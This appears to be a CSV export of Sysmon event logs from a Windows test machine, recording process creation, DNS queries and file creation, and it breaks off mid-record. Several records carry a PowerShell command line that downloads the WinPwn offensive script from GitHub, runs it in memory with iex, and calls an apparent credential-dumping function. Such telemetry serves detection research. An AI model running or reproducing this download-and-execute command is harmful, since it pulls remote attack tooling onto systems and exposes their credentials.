Channel,CommandLine,Company,Computer,CreationUtcTime,CurrentDirectory,Description,DestinationHostname,DestinationIp,DestinationIsIpv6,DestinationPort,DestinationPortName,Details,EventID,EventRecordID,EventType,FileVersion,Hashes,Image,Initiated,IntegrityLevel,Keywords,Level,LogonGuid,LogonId,Message,Opcode,OriginalFileName,ParentCommandLine,ParentImage,ParentProcessGuid,ParentProcessId,ParentUser,ProcessGuid,ProcessID,ProcessId,Product,Protocol,QueryName,QueryResults,QueryStatus,RenderingInfo,RuleName,SourceHostname,SourceIp,SourceIsIpv6,SourcePort,SourcePortName,SystemTime,TargetFilename,TargetObject,Task,TerminalSessionId,ThreadID,User,UserID,UtcTime,Version,raw
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\system32\appidcertstorecheck.exe""",Microsoft Corporation,WinDev2309Eval,,C:\Windows\system32\,AppID Certificate Store Verification Task,,,,,,,1,19599,,10.0.22621.2506 (WinBuild.160101.0800),"MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6",C:\Windows\System32\appidcertstorecheck.exe,,System,0x8000000000000000,Information,{f57bd86a-36f6-658c-e503-000000000000},0x3e5,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:09:43.096

ProcessGuid: {f57bd86a-8487-658c-d401-000000000f00}

ProcessId: 5268

Image: C:\Windows\System32\appidcertstorecheck.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: AppID Certificate Store Verification Task

Product: Microsoft® Windows® Operating System

Company: Microsoft Corporation

OriginalFileName: AppIDCertstoreCheck.exe

CommandLine: ""C:\Windows\system32\appidcertstorecheck.exe""

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\LOCAL SERVICE

LogonGuid: {f57bd86a-36f6-658c-e503-000000000000}

LogonId: 0x3E5

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6

ParentProcessGuid: {f57bd86a-36f6-658c-1d00-000000000f00}

ParentProcessId: 1496

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule

ParentUser: NT AUTHORITY\SYSTEM",Info,AppIDCertstoreCheck.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,C:\Windows\System32\svchost.exe,{f57bd86a-36f6-658c-1d00-000000000f00},1496,NT AUTHORITY\SYSTEM,{f57bd86a-8487-658c-d401-000000000f00},3588,5268,Microsoft® Windows® Operating System,,,,,"
      ",-,,,,,,2023-12-27T20:09:43.0996564Z,,,Process Create (rule: ProcessCreate),0,5124,NT AUTHORITY\LOCAL SERVICE,S-1-5-18,2023-12-27 20:09:43.096,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:09:43.0996564Z""/>
      <EventRecordID>19599</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:09:43.096</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8487-658c-d401-000000000f00}</Data>
      <Data Name=""ProcessId"">5268</Data>
      <Data Name=""Image"">C:\Windows\System32\appidcertstorecheck.exe</Data>
      <Data Name=""FileVersion"">10.0.22621.2506 (WinBuild.160101.0800)</Data>
      <Data Name=""Description"">AppID Certificate Store Verification Task</Data>
      <Data Name=""Product"">Microsoft&#174; Windows&#174; Operating System</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">AppIDCertstoreCheck.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\system32\appidcertstorecheck.exe""</Data>
      <Data Name=""CurrentDirectory"">C:\Windows\system32\</Data>
      <Data Name=""User"">NT AUTHORITY\LOCAL SERVICE</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f6-658c-e503-000000000000}</Data>
      <Data Name=""LogonId"">0x3e5</Data>
      <Data Name=""TerminalSessionId"">0</Data>
      <Data Name=""IntegrityLevel"">System</Data>
      <Data Name=""Hashes"">MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-36f6-658c-1d00-000000000f00}</Data>
      <Data Name=""ParentProcessId"">1496</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\svchost.exe</Data>
      <Data Name=""ParentCommandLine"">C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule</Data>
      <Data Name=""ParentUser"">NT AUTHORITY\SYSTEM</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:09:43.096

ProcessGuid: {f57bd86a-8487-658c-d401-000000000f00}

ProcessId: 5268

Image: C:\Windows\System32\appidcertstorecheck.exe

FileVersion: 10.0.22621.2506 (WinBuild.160101.0800)

Description: AppID Certificate Store Verification Task

Product: Microsoft&#174; Windows&#174; Operating System

Company: Microsoft Corporation

OriginalFileName: AppIDCertstoreCheck.exe

CommandLine: ""C:\Windows\system32\appidcertstorecheck.exe""

CurrentDirectory: C:\Windows\system32\

User: NT AUTHORITY\LOCAL SERVICE

LogonGuid: {f57bd86a-36f6-658c-e503-000000000000}

LogonId: 0x3E5

TerminalSessionId: 0

IntegrityLevel: System

Hashes: MD5=A3D3C1CF254BF1B45F5950EFAD6621AF,SHA256=82906ECB6EE934ED28839F127F7994A517B9D9C83746187246D6F226FB6A65E6,IMPHASH=7168353EDBE3AB24A184BB681FD55AE6

ParentProcessGuid: {f57bd86a-36f6-658c-1d00-000000000f00}

ParentProcessId: 1496

ParentImage: C:\Windows\System32\svchost.exe

ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule

ParentUser: NT AUTHORITY\SYSTEM</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,19598,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:48.919

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

QueryName: github.com

QueryStatus: 0

QueryResults: ::ffff:140.82.121.4;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8479-658c-d001-000000000f00},3588,1092,,,github.com,::ffff:140.82.121.4;,0,"
      ",-,,,,,,2023-12-27T20:09:34.4941031Z,,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:48.919,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:09:34.4941031Z""/>
      <EventRecordID>19598</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:48.919</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8479-658c-d001-000000000f00}</Data>
      <Data Name=""ProcessId"">1092</Data>
      <Data Name=""QueryName"">github.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:140.82.121.4;</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:48.919

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

QueryName: github.com

QueryStatus: 0

QueryResults: ::ffff:140.82.121.4;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,2023-12-27 20:09:32.413,,,,,,,,,11,19597,,,,C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,,,0x8000000000000000,Information,,,"File created:

RuleName: DLL

UtcTime: 2023-12-27 20:09:32.538

ProcessGuid: {f57bd86a-847c-658c-d201-000000000f00}

ProcessId: 1852

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\yfexfutf.dll

CreationUtcTime: 2023-12-27 20:09:32.413

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-847c-658c-d201-000000000f00},3588,1852,,,,,,"
      ",DLL,,,,,,2023-12-27T20:09:32.5472911Z,C:\Users\User\AppData\Local\Temp\yfexfutf.dll,,File created (rule: FileCreate),,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:09:32.538,2,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>11</EventID>
      <Version>2</Version>
      <Level>4</Level>
      <Task>11</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:09:32.5472911Z""/>
      <EventRecordID>19597</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">DLL</Data>
      <Data Name=""UtcTime"">2023-12-27 20:09:32.538</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-847c-658c-d201-000000000f00}</Data>
      <Data Name=""ProcessId"">1852</Data>
      <Data Name=""Image"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</Data>
      <Data Name=""TargetFilename"">C:\Users\User\AppData\Local\Temp\yfexfutf.dll</Data>
      <Data Name=""CreationUtcTime"">2023-12-27 20:09:32.413</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>File created:

RuleName: DLL

UtcTime: 2023-12-27 20:09:32.538

ProcessGuid: {f57bd86a-847c-658c-d201-000000000f00}

ProcessId: 1852

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

TargetFilename: C:\Users\User\AppData\Local\Temp\yfexfutf.dll

CreationUtcTime: 2023-12-27 20:09:32.413

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>File created (rule: FileCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES417.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC67EB94E8E82E441A8A167AC8764D564D.TMP""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Microsoft® Resource File To COFF Object Conversion Utility,,,,,,,1,19596,,14.32.31326.0,"MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:09:32.532

ProcessGuid: {f57bd86a-847c-658c-d301-000000000f00}

ProcessId: 9968

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe

FileVersion: 14.32.31326.0

Description: Microsoft® Resource File To COFF Object Conversion Utility

Product: Microsoft® .NET Framework

Company: Microsoft Corporation

OriginalFileName: CVTRES.EXE

CommandLine: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES417.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC67EB94E8E82E441A8A167AC8764D564D.TMP""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959

ParentProcessGuid: {f57bd86a-847c-658c-d201-000000000f00}

ParentProcessId: 1852

ParentImage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

ParentCommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\yfexfutf.cmdline""

ParentUser: WINDEV2309EVAL\User",Info,CVTRES.EXE,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\yfexfutf.cmdline""",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,{f57bd86a-847c-658c-d201-000000000f00},1852,WINDEV2309EVAL\User,{f57bd86a-847c-658c-d301-000000000f00},3588,9968,Microsoft® .NET Framework,,,,,"
      ",-,,,,,,2023-12-27T20:09:32.5338141Z,,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:09:32.532,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:09:32.5338141Z""/>
      <EventRecordID>19596</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:09:32.532</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-847c-658c-d301-000000000f00}</Data>
      <Data Name=""ProcessId"">9968</Data>
      <Data Name=""Image"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe</Data>
      <Data Name=""FileVersion"">14.32.31326.0</Data>
      <Data Name=""Description"">Microsoft&#174; Resource File To COFF Object Conversion Utility</Data>
      <Data Name=""Product"">Microsoft&#174; .NET Framework</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">CVTRES.EXE</Data>
      <Data Name=""CommandLine"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES417.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC67EB94E8E82E441A8A167AC8764D564D.TMP""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-847c-658c-d201-000000000f00}</Data>
      <Data Name=""ParentProcessId"">1852</Data>
      <Data Name=""ParentImage"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</Data>
      <Data Name=""ParentCommandLine"">""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\yfexfutf.cmdline""</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:09:32.532

ProcessGuid: {f57bd86a-847c-658c-d301-000000000f00}

ProcessId: 9968

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe

FileVersion: 14.32.31326.0

Description: Microsoft&#174; Resource File To COFF Object Conversion Utility

Product: Microsoft&#174; .NET Framework

Company: Microsoft Corporation

OriginalFileName: CVTRES.EXE

CommandLine: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\User\AppData\Local\Temp\RES417.tmp"" ""c:\Users\User\AppData\Local\Temp\CSC67EB94E8E82E441A8A167AC8764D564D.TMP""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=8166CCB6A04B855AA918B36079C63B7D,SHA256=FD3EF1B4C91B2E85CCD05724A7CD527A3A27D7D549B0DCDB70D3D78BE120C560,IMPHASH=45A00F7304B8F089973962FBEF618959

ParentProcessGuid: {f57bd86a-847c-658c-d201-000000000f00}

ParentProcessId: 1852

ParentImage: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

ParentCommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\yfexfutf.cmdline""

ParentUser: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Process Create (rule: ProcessCreate)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,,,WinDev2309Eval,,,,,,,,,,22,19595,,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,0x8000000000000000,Information,,,"Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:47.256

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.109.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.110.133;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User",Info,,,,,,,{f57bd86a-8479-658c-d001-000000000f00},3588,1092,,,raw.githubusercontent.com,::ffff:185.199.109.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.110.133;,0,"
      ",-,,,,,,2023-12-27T20:09:32.4772027Z,,,Dns query (rule: DnsQuery),,5164,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 14:52:47.256,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>22</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>22</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:09:32.4772027Z""/>
      <EventRecordID>19595</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5164""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 14:52:47.256</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-8479-658c-d001-000000000f00}</Data>
      <Data Name=""ProcessId"">1092</Data>
      <Data Name=""QueryName"">raw.githubusercontent.com</Data>
      <Data Name=""QueryStatus"">0</Data>
      <Data Name=""QueryResults"">::ffff:185.199.109.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.110.133;</Data>
      <Data Name=""Image"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Dns query:

RuleName: -

UtcTime: 2023-12-27 14:52:47.256

ProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ProcessId: 1092

QueryName: raw.githubusercontent.com

QueryStatus: 0

QueryResults: ::ffff:185.199.109.133;::ffff:185.199.111.133;::ffff:185.199.108.133;::ffff:185.199.110.133;

Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

User: WINDEV2309EVAL\User</Message>
      <Level>Information</Level>
      <Task>Dns query (rule: DnsQuery)</Task>
      <Opcode>Info</Opcode>
    </RenderingInfo>
  </Event>
  
"
Microsoft-Windows-Sysmon/Operational,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\yfexfutf.cmdline""",Microsoft Corporation,WinDev2309Eval,,C:\Users\User\AppData\Local\Temp\,Visual C# Command Line Compiler,,,,,,,1,19594,,4.8.9032.0 built by: NET481REL1,"MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259",C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe,,Medium,0x8000000000000000,Information,{f57bd86a-36f9-658c-7bf8-020000000000},0x2f87b,"Process Create:

RuleName: -

UtcTime: 2023-12-27 20:09:32.416

ProcessGuid: {f57bd86a-847c-658c-d201-000000000f00}

ProcessId: 1852

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

FileVersion: 4.8.9032.0 built by: NET481REL1

Description: Visual C# Command Line Compiler

Product: Microsoft® .NET Framework

Company: Microsoft Corporation

OriginalFileName: csc.exe

CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\yfexfutf.cmdline""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

User: WINDEV2309EVAL\User

LogonGuid: {f57bd86a-36f9-658c-7bf8-020000000000}

LogonId: 0x2F87B

TerminalSessionId: 1

IntegrityLevel: Medium

Hashes: MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259

ParentProcessGuid: {f57bd86a-8479-658c-d001-000000000f00}

ParentProcessId: 1092

ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

ParentCommandLine: ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive}

ParentUser: WINDEV2309EVAL\User",Info,csc.exe,"""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive}",C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,{f57bd86a-8479-658c-d001-000000000f00},1092,WINDEV2309EVAL\User,{f57bd86a-847c-658c-d201-000000000f00},3588,1852,Microsoft® .NET Framework,,,,,"
      ",-,,,,,,2023-12-27T20:09:32.4177646Z,,,Process Create (rule: ProcessCreate),1,5124,WINDEV2309EVAL\User,S-1-5-18,2023-12-27 20:09:32.416,5,"<Event xmlns=""http://schemas.microsoft.com/win/2004/08/events/event"">
    <System>
      <Provider Name=""Microsoft-Windows-Sysmon"" Guid=""{5770385f-c22a-43e0-bf4c-06f5698ffbd9}""/>
      <EventID>1</EventID>
      <Version>5</Version>
      <Level>4</Level>
      <Task>1</Task>
      <Opcode>0</Opcode>
      <Keywords>0x8000000000000000</Keywords>
      <TimeCreated SystemTime=""2023-12-27T20:09:32.4177646Z""/>
      <EventRecordID>19594</EventRecordID>
      <Correlation/>
      <Execution ProcessID=""3588"" ThreadID=""5124""/>
      <Channel>Microsoft-Windows-Sysmon/Operational</Channel>
      <Computer>WinDev2309Eval</Computer>
      <Security UserID=""S-1-5-18""/>
    </System>
    <EventData>
      <Data Name=""RuleName"">-</Data>
      <Data Name=""UtcTime"">2023-12-27 20:09:32.416</Data>
      <Data Name=""ProcessGuid"">{f57bd86a-847c-658c-d201-000000000f00}</Data>
      <Data Name=""ProcessId"">1852</Data>
      <Data Name=""Image"">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe</Data>
      <Data Name=""FileVersion"">4.8.9032.0 built by: NET481REL1</Data>
      <Data Name=""Description"">Visual C# Command Line Compiler</Data>
      <Data Name=""Product"">Microsoft&#174; .NET Framework</Data>
      <Data Name=""Company"">Microsoft Corporation</Data>
      <Data Name=""OriginalFileName"">csc.exe</Data>
      <Data Name=""CommandLine"">""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\yfexfutf.cmdline""</Data>
      <Data Name=""CurrentDirectory"">C:\Users\User\AppData\Local\Temp\</Data>
      <Data Name=""User"">WINDEV2309EVAL\User</Data>
      <Data Name=""LogonGuid"">{f57bd86a-36f9-658c-7bf8-020000000000}</Data>
      <Data Name=""LogonId"">0x2f87b</Data>
      <Data Name=""TerminalSessionId"">1</Data>
      <Data Name=""IntegrityLevel"">Medium</Data>
      <Data Name=""Hashes"">MD5=0700180046633A40D24729AE8CACC158,SHA256=A725546BDE53F1AD533E74ABB01DD5ED5F07B171F5C284738DA88F6CE478CF5F,IMPHASH=2E6A9097FBA347A254DAC72662FE1259</Data>
      <Data Name=""ParentProcessGuid"">{f57bd86a-8479-658c-d001-000000000f00}</Data>
      <Data Name=""ParentProcessId"">1092</Data>
      <Data Name=""ParentImage"">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
      <Data Name=""ParentCommandLine"">""powershell.exe"" &amp; {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
safedump -consoleoutput -noninteractive}</Data>
      <Data Name=""ParentUser"">WINDEV2309EVAL\User</Data>
    </EventData>
    <RenderingInfo Culture=""en-US"">
      <Message>Process Create:

RuleName: -

UtcTime: 2023-12-27 20:09:32.416

ProcessGuid: {f57bd86a-847c-658c-d201-000000000f00}

ProcessId: 1852

Image: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe

FileVersion: 4.8.9032.0 built by: NET481REL1

Description: Visual C# Command Line Compiler

Product: Microsoft&#174; .NET Framework

Company: Microsoft Corporation

OriginalFileName: csc.exe

CommandLine: ""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"" /noconfig /fullpaths @""C:\Users\User\AppData\Local\Temp\yfexfutf.cmdline""

CurrentDirectory: C:\Users\User\AppData\Local\Temp\

